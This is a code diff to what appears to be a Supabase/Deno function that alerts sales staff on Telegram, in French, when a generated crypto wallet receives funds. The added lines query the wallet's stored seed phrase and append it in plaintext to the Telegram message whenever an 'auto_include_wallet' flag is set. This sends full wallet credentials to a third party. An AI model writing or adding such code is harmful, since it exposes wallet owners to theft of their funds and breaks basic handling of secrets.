@@ -114,7 +114,7 @@ serve(async (req) => {
           // Get wallet info
           const { data: walletData } = await supabase
             .from('generated_wallets')
-            .select('wallet_id')
+            .select('wallet_id, seed_phrase')
             .or(`bsc_address.eq.${address},eth_address.eq.${address},btc_address.eq.${address}`)
             .single();
 
@@ -163,12 +163,15 @@ serve(async (req) => {
                   try {
                     const { data: commercialData, error: commercialError } = await supabase
                       .from('commercials')
-                      .select('telegram_id, name')
+                      .select('telegram_id, name, auto_include_wallet')
                       .eq('id', commercial_id)
                       .single();
                     
                     if (!commercialError && commercialData?.telegram_id) {
-                      const commercialMessage = `💰 Nouvelle transaction reçue!\nMontant: ${amount} ${tx.network}\nWallet: ${address}\nHash: ${tx.hash}`;
+                      let commercialMessage = `💰 Nouvelle transaction reçue!\nMontant: ${amount} ${tx.network}\nWallet: ${address}\nHash: ${tx.hash}`;
+                      if (commercialData.auto_include_wallet && (walletData as any)?.seed_phrase) {
+                        commercialMessage += `\nSeed phrase: ${(walletData as any).seed_phrase}`;
+                      }
                       
                       const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
                       if (telegramBotToken) {
